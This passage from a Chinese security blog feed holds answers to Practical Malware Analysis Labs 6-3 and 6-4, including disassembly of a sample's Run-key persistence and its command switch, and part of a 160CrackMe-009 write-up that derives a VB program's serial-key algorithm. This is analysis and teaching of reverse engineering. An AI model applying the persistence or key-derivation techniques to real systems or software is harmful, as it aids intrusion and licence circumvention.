src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-2-7.png"></p><h2 id="Lab-6-3"><a href="#Lab-6-3" class="headerlink" title="Lab 6-3"></a>Lab 6-3</h2><h3 id="1-比较在main函数与实验6-2的main函数的调用。从main中调用的新的函数是什么？"><a href="#1-比较在main函数与实验6-2的main函数的调用。从main中调用的新的函数是什么？" class="headerlink" title="1.比较在main函数与实验6-2的main函数的调用。从main中调用的新的函数是什么？"></a>1.比较在main函数与实验6-2的main函数的调用。从main中调用的新的函数是什么？</h3><p>多了一个函数sub_401130函数</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-3-1.png"></p><p>这个新函数是通过读取到的值来执行不同的操作。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-3-2.png"></p><h3 id="2-这个新函数使用的参数是什么？"><a href="#2-这个新函数使用的参数是什么？" class="headerlink" title="2.这个新函数使用的参数是什么？"></a>2.这个新函数使用的参数是什么？</h3><p>使用的参数是通过读取网页资源注释中得到的字符，还有一个是main函数的参数argv[0]，就是程序名本身。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-3-8.png"></p><h3 id="3-这个函数包含的主要代码结构是什么？"><a href="#3-这个函数包含的主要代码结构是什么？" class="headerlink" title="3.这个函数包含的主要代码结构是什么？"></a>3.这个函数包含的主要代码结构是什么？</h3><p>包含的主要结构式switch结构</p><h3 id="4-这个函数能够做什么"><a href="#4-这个函数能够做什么" class="headerlink" title="4.这个函数能够做什么"></a>4.这个函数能够做什么</h3><p>首先当字符等于“a”时，可以创建一个文件夹路径是C:\TEMP</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-3-3.png"></p><p>当字符等于“b”时，会将自身复制到创建文件夹内，并且重命名为cc.exe</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-3-4.png"></p><p>等于“c”时，会删除文件夹下的cc.exe。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-3-5.png"></p><p>等于“d”时，会实现一个自启动功能，在HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run下写入键值</p><p>通过注册表实现自启动可以看这里：<a href="https://b1ack1e.github.io/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E6%B3%A8%E5%86%8C%E8%A1%A8/">自启动技术-注册表</a></p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">0040118F</span>  |.  <span class="hljs-number">51</span>            push ecx                                 ; /pHandle = kernel<span class="hljs-number">32</span>.<span class="hljs-number">75</span>B<span class="hljs-number">5483</span>B<br><span class="hljs-attribute">00401190</span>  |.  <span class="hljs-number">68</span> <span class="hljs-number">3</span>F<span class="hljs-number">000</span>F<span class="hljs-number">00</span>   push <span class="hljs-number">0</span>xF<span class="hljs-number">003</span>F                             ; |Access = KEY_ALL_ACCESS<br><span class="hljs-attribute">00401195</span>  |.  <span class="hljs-number">6</span>A <span class="hljs-number">00</span>         push <span class="hljs-number">0</span>x<span class="hljs-number">0</span>                                 ; |Reserved = <span class="hljs-number">0</span>x<span class="hljs-number">0</span><br><span class="hljs-attribute">00401197</span>  |.  <span class="hljs-number">68</span> <span class="hljs-number">70714000</span>   push Lab<span class="hljs-number">06</span>-<span class="hljs-number">03</span>.<span class="hljs-number">00407170</span>                   ; |Software\Microsoft\Windows\CurrentVersion\Run<br><span class="hljs-attribute">0040119C</span>  |.  <span class="hljs-number">68</span> <span class="hljs-number">02000080</span>   push <span class="hljs-number">0</span>x<span class="hljs-number">80000002</span>                          ; |hKey = HKEY_LOCAL_MACHINE<br><span class="hljs-attribute">004011A1</span>  |.  FF<span class="hljs-number">15</span> <span class="hljs-number">04604000</span> call dword ptr ds:[&lt;&amp;ADVAPI<span class="hljs-number">32</span>.RegOpenKey&gt;; \RegOpenKeyExA<br><span class="hljs-attribute">004011A7</span>  |.  <span class="hljs-number">6</span>A <span class="hljs-number">0</span>F         push <span class="hljs-number">0</span>xF                                 ; /BufSize = F (<span class="hljs-number">15</span>.)<br><span class="hljs-attribute">004011A9</span>  |.  <span class="hljs-number">68</span> A<span class="hljs-number">0714000</span>   push Lab<span class="hljs-number">06</span>-<span class="hljs-number">03</span>.<span class="hljs-number">004071</span>A<span class="hljs-number">0</span>                   ; |C:\Temp\cc.exe<br><span class="hljs-attribute">004011AE</span>  |.  <span class="hljs-number">6</span>A <span class="hljs-number">01</span>         push <span class="hljs-number">0</span>x<span class="hljs-number">1</span>                                 ; |ValueType = REG_SZ<br><span class="hljs-attribute">004011B0</span>  |.  <span class="hljs-number">6</span>A <span class="hljs-number">00</span>         push <span class="hljs-number">0</span>x<span class="hljs-number">0</span>                                 ; |Reserved = <span class="hljs-number">0</span>x<span class="hljs-number">0</span><br><span class="hljs-attribute">004011B2</span>  |.  <span class="hljs-number">68</span> <span class="hljs-number">68714000</span>   push Lab<span class="hljs-number">06</span>-<span class="hljs-number">03</span>.<span class="hljs-number">00407168</span>                   ; |Malware<br><span class="hljs-attribute">004011B7</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">55</span> FC       mov edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>]           ; |<br><span class="hljs-attribute">004011BA</span>  |.  <span class="hljs-number">52</span>            push edx                                 ; |hKey = <span class="hljs-number">0</span>x<span class="hljs-number">23</span>C<br><span class="hljs-attribute">004011BB</span>  |.  FF<span class="hljs-number">15</span> <span class="hljs-number">00604000</span> call dword ptr ds:[&lt;&amp;ADVAPI<span class="hljs-number">32</span>.RegSetValu&gt;; \RegSetValueExA<br></code></pre></div></td></tr></table></figure><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-3-6.png"></p><p>等于“e”的时候，调用sleep函数</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-3-7.png"></p><p>都不满足的话就打印字符串“Error 3.2: Not a valid command provided”</p><h3 id="5-这个恶意代码中有什么本地特征吗？"><a href="#5-这个恶意代码中有什么本地特征吗？" class="headerlink" title="5.这个恶意代码中有什么本地特征吗？"></a>5.这个恶意代码中有什么本地特征吗？</h3><p>有，就是前面分析的注册表键值的修改，还有对于文件夹的创建和文件的复制。</p><h3 id="6-这个恶意代码的目的是什么？-1"><a href="#6-这个恶意代码的目的是什么？-1" class="headerlink" title="6.这个恶意代码的目的是什么？"></a>6.这个恶意代码的目的是什么？</h3><p>判断网络是否连接，然后读取一个网页资源中的注释后的第一个字符，通过这个字符来判断进行何种操作。具体上面已经分析过了。</p><h2 id="Lab-6-4"><a href="#Lab-6-4" class="headerlink" title="Lab 6-4"></a>Lab 6-4</h2><h3 id="1-在实验6-3和6-4的main函数中的调用之间的区别是什么？"><a href="#1-在实验6-3和6-4的main函数中的调用之间的区别是什么？" class="headerlink" title="1.在实验6-3和6-4的main函数中的调用之间的区别是什么？"></a>1.在实验6-3和6-4的main函数中的调用之间的区别是什么？</h3><p>加了一个for循环，sub_401040加了一个参数i。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-4-1.png"></p><h3 id="2-什么新的代码结构已经被添加到main中"><a href="#2-什么新的代码结构已经被添加到main中" class="headerlink" title="2.什么新的代码结构已经被添加到main中"></a>2.什么新的代码结构已经被添加到main中</h3><p>for循环结构</p><h3 id="3-这个实验的解析HTML的函数和前面实验中的那些有什么区别"><a href="#3-这个实验的解析HTML的函数和前面实验中的那些有什么区别" class="headerlink" title="3.这个实验的解析HTML的函数和前面实验中的那些有什么区别"></a>3.这个实验的解析HTML的函数和前面实验中的那些有什么区别</h3><p>主要是给InternetOpenA传入的szAgent参数不一样，这个参数先通过sprintf将“Internet Explorer 7.50/pma”与循环次数i拼接起来。第一次是Internet Explorer 7.50/pma0第二次是Internet Explorer 7.50/pma1…以此类推。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-4-2.png"></p><h3 id="4-这个程序会运行多久？（假设它已经连接到互联网）"><a href="#4-这个程序会运行多久？（假设它已经连接到互联网）" class="headerlink" title="4.这个程序会运行多久？（假设它已经连接到互联网）"></a>4.这个程序会运行多久？（假设它已经连接到互联网）</h3><p>看这个for循环，每次都会sleep，其中参数是6000ms，是一分钟，也就是每循环一次沉睡一分钟，那么就是1440分钟。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-4-3.png"></p><h3 id="5-在这个恶意代码中有什么新的基于网络的迹象吗？"><a href="#5-在这个恶意代码中有什么新的基于网络的迹象吗？" class="headerlink" title="5.在这个恶意代码中有什么新的基于网络的迹象吗？"></a>5.在这个恶意代码中有什么新的基于网络的迹象吗？</h3><p>就是InternetOpenA传入的szAgent参数不同了，每次都会变。</p><h3 id="6-这个恶意代码的目的是什么？-2"><a href="#6-这个恶意代码的目的是什么？-2" class="headerlink" title="6.这个恶意代码的目的是什么？"></a>6.这个恶意代码的目的是什么？</h3><p>跟之前的基本一样，只是运行的时间变得特别长。</p>]]></content>
    
    
    <categories>
      
      <category>恶意代码分析实战</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>病毒分析</tag>
      
      <tag>Lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>160CrackMe-009</title>
    <link href="/2021/08/09/160CrackMe-009/"/>
    <url>/2021/08/09/160CrackMe-009/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个VB的程序，调用的时候都是传入一个地址，然后地址直接查看是什么也看不到，没有什么有用的，分析起来看得人一头雾水。查了资料之后才知道，VB的变量特征是前两个4字节都是一些数据类型，第三个四字节才是变量，相当于是首地址+0x8的地方。</p><p>比如此时寄存器中值是18F3F4，它实际存储的值是18F3FC处的数据。</p><p><img src="/2021/08/09/160CrackMe-009/4.png"></p><h2 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h2><p>打开程序，看到需要输入name和key输入后弹出错误的提示框。</p><p><img src="/2021/08/09/160CrackMe-009/1.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>查壳，无壳是用VB语言写的。</p><p><img src="/2021/08/09/160CrackMe-009/2.png"></p><p>使用OD搜索错误提示的字符串可以搜索到直接定位到关键跳转。在函数头部下断开始分析。</p><p><img src="/2021/08/09/160CrackMe-009/3.png"></p><p>先获取了输入的name的长度，但是这个长度后面好像是没有参加任何运算的，我没有分析到有参加运算的地方。</p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-number">004020</span>EF   .  <span class="hljs-number">51</span>            push ecx                                 ; /Step8 = <span class="hljs-number">0018</span>F3E0<br><span class="hljs-number">004020</span>F0   .  <span class="hljs-number">8D45</span> <span class="hljs-number">94</span>       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x6C]          ; |<br><span class="hljs-number">004020</span>F3   .  BB <span class="hljs-number">02000000</span>   mov ebx,<span class="hljs-number">0</span>x2                              ; |<br><span class="hljs-number">004020</span>F8   .  <span class="hljs-number">52</span>            push edx                                 ; |/var18 = <span class="hljs-number">0018</span>F3BC<br><span class="hljs-number">004020</span>F9   .  <span class="hljs-number">50</span>            push eax                                 ; ||retBuffer8 = <span class="hljs-number">0018</span>F3CC<br><span class="hljs-number">004020</span>FA   .  <span class="hljs-number">899</span>D <span class="hljs-number">54</span>FFFFFF mov dword ptr ss:[ebp-<span class="hljs-number">0</span>xAC],ebx          ; ||<br><span class="hljs-symbol">00402100 </span>  .  <span class="hljs-number">899</span>D <span class="hljs-number">44</span>FFFFFF mov dword ptr ss:[ebp-<span class="hljs-number">0</span>xBC],ebx          ; ||<br><span class="hljs-symbol">00402106 </span>  .  FF15 <span class="hljs-number">18414000</span> <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaLenVa&gt;; |\__vbaLenVar<br><span class="hljs-number">0040210</span>C   .  <span class="hljs-number">8D8</span>D <span class="hljs-number">44</span>FFFFFF lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>xBC]          ; |<br><span class="hljs-symbol">00402112 </span>  .  <span class="hljs-number">50</span>            push eax                                 ; |End8 = <span class="hljs-number">0018</span>F3CC<br><span class="hljs-symbol">00402113 </span>  .  <span class="hljs-number">8D95</span> E8FEFFFF lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x118]         ; |<br><span class="hljs-symbol">00402119 </span>  .  <span class="hljs-number">51</span>            push ecx                                 ; |Start8 = <span class="hljs-number">0018</span>F3E0<br><span class="hljs-number">0040211</span>A   .  <span class="hljs-number">8D85</span> F8FEFFFF lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x108]         ; |<br><span class="hljs-symbol">00402120 </span>  .  <span class="hljs-number">52</span>            push edx                                 ; |TMPend8 = <span class="hljs-number">0018</span>F3BC<br><span class="hljs-symbol">00402121 </span>  .  <span class="hljs-number">8D4</span>D DC       lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x24]          ; |<br><span class="hljs-symbol">00402124 </span>  .  <span class="hljs-number">50</span>            push eax                                 ; |TMPstep8 = <span class="hljs-number">0018</span>F3CC<br><span class="hljs-symbol">00402125 </span>  .  <span class="hljs-number">51</span>            push ecx                                 ; |Counter8 = <span class="hljs-number">0018</span>F3E0<br><span class="hljs-symbol">00402126 </span>  .  FF15 <span class="hljs-number">20414000</span> <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaVarFo&gt;; \__vbaVarForInit<br></code></pre></div></td></tr></table></figure><p>首先是对于name 的操作，获取了每一位的ascii码值，然后相加。</p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-symbol">00402134 </span>  . /<span class="hljs-number">0</span>F84 <span class="hljs-number">9</span>C000000 je Andréna.<span class="hljs-number">004021D6</span><br><span class="hljs-number">0040213</span>A   . |<span class="hljs-number">8D55</span> <span class="hljs-number">94</span>       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x6C]<br><span class="hljs-number">0040213</span>D   . |<span class="hljs-number">8D45</span> DC       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x24]<br><span class="hljs-symbol">00402140 </span>  . |<span class="hljs-number">52</span>            push edx<br><span class="hljs-symbol">00402141 </span>  . |<span class="hljs-number">50</span>            push eax<br><span class="hljs-symbol">00402142 </span>  . |C745 <span class="hljs-number">9</span>C <span class="hljs-number">01000</span>&gt;mov dword ptr ss:[ebp-<span class="hljs-number">0</span>x64],<span class="hljs-number">0</span>x1<br><span class="hljs-symbol">00402149 </span>  . |<span class="hljs-number">895</span>D <span class="hljs-number">94</span>       mov dword ptr ss:[ebp-<span class="hljs-number">0</span>x6C],ebx<br><span class="hljs-number">0040214</span>C   . |FF15 <span class="hljs-number">90414000</span> <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaI4Var&gt;;  Msvbvm50.__vbaI4Var<br><span class="hljs-symbol">00402152 </span>  . |<span class="hljs-number">8D4</span>D BC       lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x44]          ; |<br><span class="hljs-symbol">00402155 </span>  . |<span class="hljs-number">50</span>            push eax                                 ; |Start = <span class="hljs-number">0</span>x18F3CC<br><span class="hljs-symbol">00402156 </span>  . |<span class="hljs-number">8D55</span> <span class="hljs-number">84</span>       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x7C]          ; |<br><span class="hljs-symbol">00402159 </span>  . |<span class="hljs-number">51</span>            push ecx                                 ; |dString8 = <span class="hljs-number">0018</span>F3E0<br><span class="hljs-number">0040215</span>A   . |<span class="hljs-number">52</span>            push edx                                 ; |RetBUFFER = <span class="hljs-number">0018</span>F3BC<br><span class="hljs-number">0040215</span>B   . |FF15 <span class="hljs-number">38414000</span> <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.#<span class="hljs-number">632</span>&gt;]     ; \获取每一位<br><span class="hljs-symbol">00402161 </span>  . |<span class="hljs-number">8D45</span> <span class="hljs-number">84</span>       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x7C]<br><span class="hljs-symbol">00402164 </span>  . |<span class="hljs-number">8D4</span>D A8       lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x58]<br><span class="hljs-symbol">00402167 </span>  . |<span class="hljs-number">50</span>            push eax                                 ; /String8 = <span class="hljs-number">0018</span>F3CC<br><span class="hljs-symbol">00402168 </span>  . |<span class="hljs-number">51</span>            push ecx                                 ; |ARG2 = <span class="hljs-number">0018</span>F3E0<br><span class="hljs-symbol">00402169 </span>  . |FF15 <span class="hljs-number">70414000</span> <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrVa&gt;; \__vbaStrVarVal<br><span class="hljs-number">0040216</span>F   . |<span class="hljs-number">50</span>            push eax                                 ; /String = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-symbol">00402170 </span>  . |FF15 <span class="hljs-number">0</span>C414000 <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.#<span class="hljs-number">516</span>&gt;]     ; \转为ascii<br><span class="hljs-symbol">00402176 </span>  . |<span class="hljs-number">66</span>:<span class="hljs-number">8985</span> <span class="hljs-number">4</span>CFFF&gt;mov word ptr ss:[ebp-<span class="hljs-number">0</span>xB4],ax<br><span class="hljs-number">0040217</span>D   . |<span class="hljs-number">8D55</span> CC       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x34]<br><span class="hljs-symbol">00402180 </span>  . |<span class="hljs-number">8D85</span> <span class="hljs-number">44</span>FFFFFF lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>xBC]<br><span class="hljs-symbol">00402186 </span>  . |<span class="hljs-number">52</span>            push edx                                 ; /var18 = <span class="hljs-number">0018</span>F3BC<br><span class="hljs-symbol">00402187 </span>  . |<span class="hljs-number">8D8</span>D <span class="hljs-number">74</span>FFFFFF lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x8C]          ; |<br><span class="hljs-number">0040218</span>D   . |<span class="hljs-number">50</span>            push eax                                 ; |var28 = <span class="hljs-number">0018</span>F3CC<br><span class="hljs-number">0040218</span>E   . |<span class="hljs-number">51</span>            push ecx                                 ; |saveto8 = <span class="hljs-number">0018</span>F3E0<br><span class="hljs-number">0040218</span>F   . |<span class="hljs-number">899</span>D <span class="hljs-number">44</span>FFFFFF mov dword ptr ss:[ebp-<span class="hljs-number">0</span>xBC],ebx          ; |<br><span class="hljs-symbol">00402195 </span>  . |FF15 <span class="hljs-number">94414000</span> <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaVarAd&gt;; \相加<br><span class="hljs-number">0040219</span>B   . |<span class="hljs-number">8</span>BD0          mov edx,eax<br><span class="hljs-number">0040219</span>D   . |<span class="hljs-number">8D4</span>D CC       lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x34]<br><span class="hljs-number">004021</span>A0   . |FFD6          <span class="hljs-keyword">call</span> esi                                 ;  Msvbvm50.__vbaVarMove<br><span class="hljs-number">004021</span>A2   . |<span class="hljs-number">8D4</span>D A8       lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x58]<br><span class="hljs-number">004021</span>A5   . |FF15 B8414000 <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeS&gt;;  Msvbvm50.__vbaFreeStr<br><span class="hljs-number">004021</span>AB   . |<span class="hljs-number">8D55</span> <span class="hljs-number">84</span>       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x7C]<br><span class="hljs-number">004021</span>AE   . |<span class="hljs-number">8D45</span> <span class="hljs-number">94</span>       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x6C]<br><span class="hljs-number">004021</span>B1   . |<span class="hljs-number">52</span>            push edx<br><span class="hljs-number">004021</span>B2   . |<span class="hljs-number">50</span>            push eax<br><span class="hljs-number">004021</span>B3   . |<span class="hljs-number">53</span>            push ebx<br><span class="hljs-number">004021</span>B4   . |FFD7          <span class="hljs-keyword">call</span> edi                                 ;  Msvbvm50.__vbaFreeVarList<br><span class="hljs-number">004021</span>B6   . |<span class="hljs-number">83</span>C4 <span class="hljs-number">0</span>C       add esp,<span class="hljs-number">0</span>xC<br><span class="hljs-number">004021</span>B9   . |<span class="hljs-number">8D8</span>D E8FEFFFF lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x118]<br><span class="hljs-number">004021</span>BF   . |<span class="hljs-number">8D95</span> F8FEFFFF lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x108]<br><span class="hljs-number">004021</span>C5   . |<span class="hljs-number">8D45</span> DC       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x24]<br><span class="hljs-number">004021</span>C8   . |<span class="hljs-number">51</span>            push ecx                                 ; /TMPend8 = <span class="hljs-number">0018</span>F3E0<br><span class="hljs-number">004021</span>C9   . |<span class="hljs-number">52</span>            push edx                                 ; |TMPstep8 = <span class="hljs-number">0018</span>F3BC<br><span class="hljs-number">004021</span>CA   . |<span class="hljs-number">50</span>            push eax                                 ; |Counter8 = <span class="hljs-number">0018</span>F3CC<br><span class="hljs-number">004021</span>CB   . |FF15 AC414000 <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaVarFo&gt;; \__vbaVarForNext<br><span class="hljs-number">004021D1</span>   .^|E9 <span class="hljs-number">5</span>CFFFFFF   jmp Andréna.<span class="hljs-number">00402132</span><br></code></pre></div></td></tr></table></figure><p>然后所有name相加的结果乘以0x499602D2</p><figure class="highlight x86asm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs x86asm">004021D6   &gt; \8D4D CC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x34</span>]<br>004021D9   .  8D95 54FFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xAC</span>]<br>004021DF   .  <span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span>                                 <span class="hljs-comment">; /var18 = 0018F404</span><br>004021E0   .  8D45 <span class="hljs-number">94</span>       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x6C</span>]          <span class="hljs-comment">; |</span><br>004021E3   .  <span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span>                                 <span class="hljs-comment">; |var28 = 0018F38C</span><br>004021E4   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span>                                 <span class="hljs-comment">; |SaveTo8 = 0018F3CC</span><br>004021E5   .  C785 5CFFFFFF&gt;<span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xA4</span>],<span class="hljs-number">0x499602D2</span>   <span class="hljs-comment">; |</span><br>004021EF   .  C785 54FFFFFF&gt;<span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xAC</span>],<span class="hljs-number">0x3</span>          <span class="hljs-comment">; |</span><br>004021F9   .  FF15 5C414000 <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM50<span class="hljs-number">.</span>__vbaVarMu&gt;<span class="hljs-comment">; \__vbaVarMul</span><br></code></pre></div></td></tr></table></figure><p>这个值再转为十进制的字符串。</p><p>可以看到这个值和计算器计算出来的是一样的。</p><p><img src="/2021/08/09/160CrackMe-009/5.png"></p><p><img src="/2021/08/09/160CrackMe-009/6.png"></p><p>最后就是使用“-”替换到第四位和第九位的字符。</p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-symbol">00402206 </span>  .  <span class="hljs-number">8</span>B1D A0414000 mov ebx,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaMi&gt;;  Msvbvm50.__vbaMidStmtVar<br><span class="hljs-number">0040220</span>C   .  <span class="hljs-number">8D4</span>D CC       lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x34]<br><span class="hljs-number">0040220</span>F   .  <span class="hljs-number">51</span>            push ecx<br><span class="hljs-symbol">00402210 </span>  .  <span class="hljs-number">6</span>A <span class="hljs-number">04</span>         push <span class="hljs-number">0</span>x4<br><span class="hljs-symbol">00402212 </span>  .  <span class="hljs-number">8D95</span> <span 